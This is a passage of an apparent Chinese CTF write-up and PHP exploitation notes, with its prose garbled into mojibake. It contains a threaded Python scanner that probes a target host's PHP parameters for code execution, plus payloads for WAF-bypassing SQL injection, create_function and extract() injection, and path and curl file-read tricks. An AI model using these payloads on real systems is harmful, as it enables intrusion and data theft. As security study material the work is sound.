time.asctime( time.localtime(time.time()) ))<br><br>s1 = threading.Semaphore(<span class="hljs-number">100</span>)                                           <br>filePath = <span class="hljs-string">r&quot;H:\Programmar\phpstudy_pro\WWW\src&quot;</span><br>os.chdir(filePath)                                                    <br>requests.adapters.DEFAULT_RETRIES = <span class="hljs-number">5</span>                             <br>files = os.listdir(filePath)<br>session = requests.Session()<br>session.keep_alive = <span class="hljs-literal">False</span>                                           <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_content</span>(<span class="hljs-params">file</span>):<br>    s1.acquire()                                                <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;trying   &#x27;</span>+file+ <span class="hljs-string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:                            <br>        gets = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>        posts = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>    data = &#123;&#125;                                                     <br>    params = &#123;&#125;                                                       <br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> gets:<br>        params[m] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> posts:<br>        data[n] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    url = <span class="hljs-string">&#x27;http://101.43.122.252:8004/&#x27;</span>+file<br>    req = session.post(url, data=data, params=params)          <br>    req.close()                                                <br>    req.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    content = req.text<br>    <span class="hljs-comment">#print(content)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:                                    <br>        flag = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> gets:<br>            req = session.get(url+<span class="hljs-string">&#x27;?%s=&#x27;</span>%a+<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)<br>            content = req.text<br>            req.close()                                              <br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                flag = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> posts:<br>                req = session.post(url, data=&#123;b:<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)<br>                content = req.text<br>                req.close()                                               <br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:                                                   <br>            param = a<br>        <span class="hljs-keyword">else</span>:<br>            param = b<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;file: &#x27;</span>+file+<span class="hljs-string">&quot;  and param:%s&quot;</span> %param)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;endtime: &#x27;</span> + time.asctime(time.localtime(time.time())))<br>    s1.release()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:                                                            <br>    t = threading.Thread(target=get_content, args=(i,))<br>    t.start()<br></code></pre></td></tr></table></figure><ul><li>æ›¿æ¢è„šæœ¬ä¸­çš„åœ°å€ä¸ºæœ¬åœ° PHP è§£å‹åçš„åœ°å€ï¼Œä¿®æ”¹ URL åœ°å€æ–¹ä¾¿æµ‹è¯•èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ã€‚</li></ul><p><img src="/WritenUp.assets%5Cimage-20220529013728647.png" alt="image-20220529013728647"></p><ul><li>å› ä¸ºå†™çš„æ˜¯å¤šçº¿ç¨‹ä¼šå‡ºç°æ— æ³•ä¸­æ–­çš„æƒ…å†µï¼Œéœ€è¦ç•™æ„ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ã€‚</li></ul><p><img src="/WritenUp.assets%5Cimage-20220529013509303.png" alt="image-20220529013509303"></p><ul><li>ç„¶åå†é¢˜ç›®ç¯å¢ƒä¸­æ‰§è¡Œå‘½ä»¤æŸ¥çœ‹ <code>flag.txt</code> è·å–åˆ° flag</li></ul><p><img src="/WritenUp.assets%5Cimage-20220529014035445.png" alt="image-20220529014035445"></p><p><code>flag&#123;this_is_smart_hacker_flag&#125;</code></p><hr><h2 id="small-tipsï¼š"><a href="#small-tipsï¼š" class="headerlink" title="small tipsï¼š"></a>small tipsï¼š</h2><ul><li><code>100.0010</code> æ­£å’Œåå€¼ç›¸ç­‰ä½†å¹¶éæ˜¯å›æ–‡åºåˆ—</li><li><code>get&#123;var]</code>  ?var[å˜é‡å]  ?var[template][tp1]&#x3D;xxx&amp;var[template][tp2]&#x3D;xxx  æ•°ç»„ template ä¸­çš„ tp1<ul><li>var[]&#x3D;aaaa é»˜è®¤ä¼ äº† var[0]&#x3D;aaaa</li><li>é€šè¿‡å˜é‡è¦†ç›–<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br></code></pre></td></tr></table></figure>ä¼  <code>flag[arg]=&#125;var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></li></ul></li></ul><hr><h2 id="PHP-ç‰¹æ€§"><a href="#PHP-ç‰¹æ€§" class="headerlink" title="PHP ç‰¹æ€§"></a>PHP ç‰¹æ€§</h2><ol><li><p>æˆ‘ä»¬çŸ¥é“ PHP å°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨ URL æˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨ <code>$=GET</code> æˆ–çš„å…³è”æ•°ç»„ <code>$_POST</code>ã€‚ä¾‹å¦‚ï¼š<code>/?foo=bar</code> å˜æˆ <code>Array([foo] =&gt; &quot;bar&quot;)</code>ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚ä¾‹å¦‚ï¼Œ<code>/?%20news[id%00=42</code> ä¼šè½¬æ¢ä¸º <code>Array([news_id] =&gt; 42)</code>ã€‚å¦‚æœä¸€ä¸ª IDS&#x2F;IPS æˆ– WAF ä¸­æœ‰ä¸€æ¡è§„åˆ™æ˜¯å½“ <code>news_id</code> å‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªéæ•°å­—çš„å€¼åˆ™æ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/news.php?%<span class="hljs-number">20</span>news[id%<span class="hljs-number">00</span>=<span class="hljs-number">42</span><span class="hljs-string">&quot;+AND+1=0--</span><br></code></pre></td></tr></table></figure><ul><li><p>ä¸Šè¿° PHP è¯­å¥çš„å‚æ•° <code>%20news[id%00</code> çš„å€¼å°†å­˜å‚¨åˆ° <code>$_GET[&quot;news_id&quot;]</code> ä¸­ã€‚</p></li><li><p>PHP éœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</p><ol><li>åˆ é™¤ç©ºç™½ç¬¦</li><li>å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">%<span class="hljs-number">20</span>foo_bar%<span class="hljs-number">00</span>                            foo_bar                            foo_bar           <br>foo%<span class="hljs-number">20</span>bar%<span class="hljs-number">00</span>                      foo bar                    foo_bar         <br>foo%<span class="hljs-number">5</span>bbar                            foo[bar                          foo_bar     <br></code></pre></td></tr></table></figure></li></ol></li><li><p><code>?%20num=var_dump(scandir(chr(47)))</code></p></li><li><p><code>$_SERVER[&#39;PHP_SELF&#39;]</code> è¡¨ç¤ºå½“å‰ php æ–‡ä»¶ç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•çš„ä½ç½®åœ°å€ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//www.5idev.com/php/ ï¼š/php/index.php</span><br>http:<span class="hljs-comment">//www.5idev.com/php/index.php ï¼š/php/index.php</span><br>http:<span class="hljs-comment">//www.5idev.com/php/index.php?test=foo ï¼š/php/index.php</span><br>http:<span class="hljs-comment">//www.5idev.com/php/index.php/test/foo ï¼š/php/index.php/test/foo</span><br></code></pre></td></tr></table></figure><ul><li><code>basename</code> åˆ™æ˜¯è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚ä½†æ˜¯ basename æœ‰ä¸ªç‰¹æ€§ï¼Œå¦‚æœæ–‡ä»¶åæ˜¯ä¸€ä¸ªä¸å¯è§å­—ç¬¦ï¼Œä¾¿ä¼šå°†ä¸Šä¸€ä¸ªç›®å½•ä½œä¸ºè¿”å›å€¼ã€‚æ¯”å¦‚ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br></code></pre></td></tr></table></figure></li><li><code>basename</code> ä¾‹å­ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$var1</span>=<span class="hljs-string">&quot;/config.php/test&quot;</span><br><span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$var1</span>)=&gt; test<br><span class="hljs-variable">$var2</span>=<span class="hljs-string">&quot;/config.php/%ff&quot;</span><br><span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$var2</span>)=&gt;config.php<br></code></pre></td></tr></table></figure></li><li>å½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ª <code>å­˜åœ¨çš„æ–‡ä»¶/ä¸å­˜åœ¨çš„æ–‡ä»¶</code> è¿™ä¸ª URL æ—¶ï¼Œphp ä¼šè‡ªåŠ¨å¿½ç•¥å¤šä½™çš„ä¸å­˜åœ¨çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚ä¸‹é¢ä¸¤ç§ URLï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/index.php<br>/index.php/dosent_exist.php<br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><code>include</code> æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„ç‰¹æ€§ï¼š</p></li></ol><ul><li>å¦‚æœå‚æ•°ä¸­åŒ…å« <code>../</code> è¿™æ ·çš„è·¯å¾„ï¼Œè§£æå™¨åˆ™ä¼šå¿½ç•¥ <code>../</code> ä¹‹å‰çš„å­—ç¬¦ä¸²è€Œå»åœ¨å½“å‰ç›®å½•çš„çˆ¶ç›®å½•ä¸‹å¯»æ‰¾æ–‡ä»¶<ul><li>è¿™æ„å‘³ç€æˆ‘ä»¬åªè¦åœ¨æƒ³è¦æŸ¥çœ‹çš„æ–‡ä»¶è·¯å¾„ä¸­ä½¿ç”¨ <code>../</code> è¿™ç±»è·¯å¾„ï¼Œ<code>include</code> å°±ä¼šè‡ªåŠ¨å¿½ç•¥å‰é¢çš„å†…å®¹ï¼Œè¿™æ ·çœŸæ­£åŒ…å«çš„æ–‡ä»¶åå°±æ˜¯æœ‰æ•ˆçš„äº†ã€‚ä¸€ç‚¹ä¸€ç‚¹è¯•å°±å¯ä»¥å¾—åˆ°æ­£ç¡®çš„è·¯å¾„äº†ã€‚</li></ul></li></ul><ol start="3"><li><strong>CURLOPT_POSTFIELDS</strong></li></ol><ul><li>å…¨éƒ¨æ•°æ®ä½¿ç”¨ HTTP åè®®ä¸­çš„ â€œPOSTâ€ æ“ä½œæ¥å‘é€ã€‚</li></ul><p>è¦å‘é€æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶åå‰é¢åŠ ä¸Š <code>@</code> å‰ç¼€å¹¶ä½¿ç”¨å®Œæ•´è·¯å¾„ã€‚ æ–‡ä»¶ç±»å‹å¯åœ¨æ–‡ä»¶ååä»¥ <code>;type=mimetype</code> çš„æ ¼å¼æŒ‡å®šã€‚è¿™ä¸ªå‚æ•°å¯ä»¥æ˜¯ <code>urlencoded</code> åçš„å­—ç¬¦ä¸²ï¼Œç±»ä¼¼ <code>&#39;para1=val1&amp;para2=val2&amp;...&#39;</code>ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªä»¥å­—æ®µåä¸ºé”®å€¼ï¼Œå­—æ®µæ•°æ®ä¸ºå€¼çš„æ•°ç»„ã€‚å¦‚æœ <code>value</code> æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œ<code>Content-Type</code> å¤´å°†ä¼šè¢«è®¾ç½®æˆ <code>multipart/form-data</code>ã€‚ä» PHP 5.2.0 å¼€å§‹ï¼Œä½¿ç”¨ <code>@</code> å‰ç¼€ä¼ é€’æ–‡ä»¶æ—¶ï¼Œ<code>value</code> å¿…é¡»æ˜¯ä¸ªæ•°ç»„ã€‚ä» PHP 5.5.0 å¼€å§‹, <code>@</code> å‰ç¼€å·²è¢«åºŸå¼ƒï¼Œæ–‡ä»¶å¯é€šè¿‡ <code>CURLFile</code> å‘é€ã€‚è®¾ç½® <code>CURLOPT_SAFE_UPLOAD</code> ä¸º <code>true</code> å¯ç¦ç”¨ <code>@</code> å‰ç¼€å‘é€æ–‡ä»¶ï¼Œä»¥å¢åŠ å®‰å…¨æ€§ã€‚</p><ul><li><p><strong>CURLOPT_SAFE_UPLOAD</strong></p></li><li><p>é»˜è®¤ <code>true</code>ã€‚ç¦ç”¨ <code>@</code> å‰ç¼€åœ¨ <code>CURLOPT_POSTFIELDS</code> ä¸­å‘é€æ–‡ä»¶ã€‚æ„å‘³ç€ <code>@</code> å¯ä»¥åœ¨å­—æ®µä¸­å®‰å…¨åœ°ä½¿ç”¨äº†ã€‚å¯ä½¿ç”¨ <code>CURLFile</code> ä½œä¸ºä¸Šä¼ çš„ä»£æ›¿ã€‚</p></li><li><p>PHP 5.5.0 ä¸­æ·»åŠ ï¼Œé»˜è®¤å€¼ <code>false</code>ã€‚ PHP 5.6.0 æ”¹é»˜è®¤å€¼ä¸º <code>true</code>ã€‚PHP 7 åˆ é™¤äº†æ­¤é€‰é¡¹ï¼Œ å¿…é¡»ä½¿ç”¨ <code>CURLFile</code> interface æ¥ä¸Šä¼ æ–‡ä»¶ã€‚</p></li><li><p>@ ç¬¦å·å‡ºç°äº†ã€‚è¿™é‡Œçš„æ„æ€å°±æ˜¯å¦‚æœ <code>CURLOPT_SAFE_UPLOAD</code> ä¸º <code>False</code>ï¼Œé‚£ä¹ˆåœ¨ <code>CURLOPT_POSTFIELDS</code> è¦å‘é€çš„æ–‡ä»¶åå‰é¢åŠ ä¸Š <code>@</code> å°±å¯ä»¥ä½¿ç”¨å®Œæ•´è·¯å¾„è¯»å–æ–‡ä»¶äº†ã€‚æ­¤æ—¶é—®é¢˜åˆæ¥åˆ°äº†ç»å…¸çš„æ–‡ä»¶ä»»æ„è¯»å–ã€‚é—®é¢˜æ˜¯ï¼Œè¯»å–å•¥æ–‡ä»¶å‘¢ï¼Ÿæˆ‘ä»¬ç°åœ¨å®Œå…¨ä¸çŸ¥é“ <code>flag</code> æ–‡ä»¶åœ¨å“ªã€‚</p></li></ul><hr><h2 id="ä¸Šä¼ è¿˜è¯»å–"><a href="#ä¸Šä¼ è¿˜è¯»å–" class="headerlink" title="ä¸Šä¼ è¿˜è¯»å–"></a>ä¸Šä¼ è¿˜è¯»å–</h2><ol><li><strong>æ— å‚å‡½æ•°å¯æ¥å—å‚æ•°</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">a</span>(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>);<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>å‘½åç©ºé—´</strong></li></ol><ul><li>å¯ä»¥ç®€å•åœ°ç†è§£ä¸ºä¸€ä¸ªâ€œæ–‡ä»¶å¤¹â€æˆ–â€œç›®å½•â€ï¼Œå®ƒç”¨æ¥ç»„ç»‡å’Œç®¡ç†ä»£ç ä¸­çš„ç±»ã€å‡½æ•°ã€å¸¸é‡ç­‰å…ƒç´ ï¼Œé¿å…åç§°å†²çªã€‚</li><li>å‘½åç©ºé—´ A å’Œå‘½åç©ºé—´ B å°±åƒæ˜¯ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹é‡Œéƒ½æœ‰ä¸€ä¸ªåä¸º <code>sayHello()</code> çš„å‡½æ•°ã€‚ç”±äºå®ƒä»¬å¤„äºä¸åŒçš„å‘½åç©ºé—´ï¼ˆæ–‡ä»¶å¤¹ï¼‰ä¸­ï¼Œæ‰€ä»¥å‡½æ•°ä¸ä¼šäº’ç›¸å†²çªã€‚</li><li>å½“ä½ åœ¨ PHP è„šæœ¬ä¸­ä¸æŒ‡å®šå‘½åç©ºé—´æ—¶ï¼Œä»£ç è¿è¡Œåœ¨å…¨å±€å‘½åç©ºé—´ä¸­ã€‚PHP ä¸å…è®¸åœ¨å…¨å±€å‘½åç©ºé—´ä¸­é‡å†™å†…ç½®å‡½æ•°ï¼ˆå¦‚ <code>sha1()</code>ï¼‰ã€‚</li><li>å‘½åç©ºé—´çš„å£°æ˜æ–¹å¼æœ‰ä¸¤ç§ï¼š<strong>å°é—­å‘½åç©ºé—´</strong> å’Œ <strong>å¼€æ”¾å‘½åç©ºé—´</strong>ã€‚ä½ æåˆ°çš„ <code>namespace interesting;</code> æ˜¯ <strong>å¼€æ”¾å‘½åç©ºé—´</strong> çš„ä¸€ç§å£°æ˜æ–¹å¼ï¼Œå®ƒä¸éœ€è¦ä½¿ç”¨ <code>&#123;&#125;</code> åŒ…å›´ä»£ç å—ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">test1</span>&#123;<br><span class="hljs-title class_">function</span> <span class="hljs-title class_">a</span>()&#123;<br><span class="hljs-title class_">echo</span> &#x27;<span class="hljs-title class_">a</span>&#x27;;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">test2</span>&#123;<br><span class="hljs-title class_">function</span> <span class="hljs-title class_">b</span>()&#123;<br><span class="hljs-title class_">echo</span> &#x27;<span class="hljs-title class_">b</span>&#x27;;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">phpinfo</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;phpinfo changed&#x27;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">namespace</span>&#123;<br>\<span class="hljs-title class_">test1</span>\<span class="hljs-title class_">a</span>(); <span class="hljs-comment"># è¾“å‡º: a</span><br>\test2\<span class="hljs-title function_ invoke__">b</span>(); <span class="hljs-comment"># è¾“å‡º: b</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>php é‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯ <code>\</code>ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°å <code>function_name()</code> è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™ <code>\function_name()</code> è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚</li><li>å¦‚æœä½ åœ¨å…¶ä»– namespace é‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">MyNamespace</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">phpinfo</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Custom phpinfo in MyNamespace&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">phpinfo</span>();  <span class="hljs-comment">// è°ƒç”¨ MyNamespace\phpinfo()ï¼Œè¾“å‡º &quot;Custom phpinfo in MyNamespace&quot;</span><br>\<span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-comment">// è°ƒç”¨å…¨å±€å‘½åç©ºé—´ä¸­çš„ phpinfo()ï¼Œè¾“å‡º PHP é…ç½®ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><p>ä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;arg&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="hljs-variable">$action</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$action</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ä¼  <code>\create_function</code></li></ul><ol start="3"><li><strong>åŒ¿åå‡½æ•°</strong></li></ol><ul><li>å˜é‡èµ‹å€¼ç¤ºä¾‹<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$greet</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Hello %s\r\n&quot;</span>, <span class="hljs-variable">$name</span>);<br>&#125;;<br><br><span class="hljs-variable">$greet</span>(<span class="hljs-string">&#x27;World&#x27;</span>);<br><span class="hljs-variable">$greet</span>(<span class="hljs-string">&#x27;PHP&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li>å›è°ƒå‡½æ•°å¯¹åŒ¿åå‡½æ•°çš„è°ƒç”¨<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace_callback</span>(<span class="hljs-string">&#x27;~-([a-z])~&#x27;</span>, function (<span class="hljs-variable">$match</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$match</span>[<span class="hljs-number">1</span>]);<br>&#125;, <span class="hljs-string">&#x27;hello-world&#x27;</span>);<br><span class="hljs-comment">// è¾“å‡º helloWorld</span><br></code></pre></td></tr></table></figure></li><li>ä½¿ç”¨ <code>USE</code> é—­åŒ…</li><li>å¯ä»¥ä»çˆ¶ä½œç”¨åŸŸä¸­ç»§æ‰¿å˜é‡ã€‚ ä»»ä½•æ­¤ç±»å˜é‡éƒ½åº”è¯¥ç”¨ <code>use</code> è¯­è¨€ç»“æ„ä¼ é€’è¿›å»ã€‚ <code>PHP7.1</code> èµ·ï¼Œä¸èƒ½ä¼ å…¥æ­¤ç±»å˜é‡ï¼š<code>superglobals</code>ã€<code>$this</code> æˆ–è€…å’Œå‚æ•°é‡åã€‚<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;<br><br><span class="hljs-variable">$example</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$message</span>);<br>&#125;;<br><span class="hljs-comment">#echo $example();  // Notice: Undefined variable: message </span><br><br><span class="hljs-variable">$example</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-keyword">use</span> (<span class="hljs-params"><span class="hljs-variable">$message</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$message</span>);<br>&#125;;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$example</span>();  <span class="hljs-comment">// string(5) &quot;hello&quot;</span><br><br><br><span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;world&#x27;</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$example</span>();   <span class="hljs-comment">//string(5) &quot;hello&quot;</span><br><br><span class="hljs-variable">$example</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) <span class="hljs-keyword">use</span> (<span class="hljs-params"><span class="hljs-variable">$message</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$arg</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$message</span>);<br>&#125;;<br><span class="hljs-variable">$example</span>(<span class="hljs-string">&quot;hello&quot;</span>);   <span class="hljs-comment">// string(11) &quot;hello world&quot;</span><br></code></pre></td></tr></table></figure></li></ul><ol start="4"><li><strong>open_basedir</strong></li></ol><ul><li><p>æ˜¯ PHP 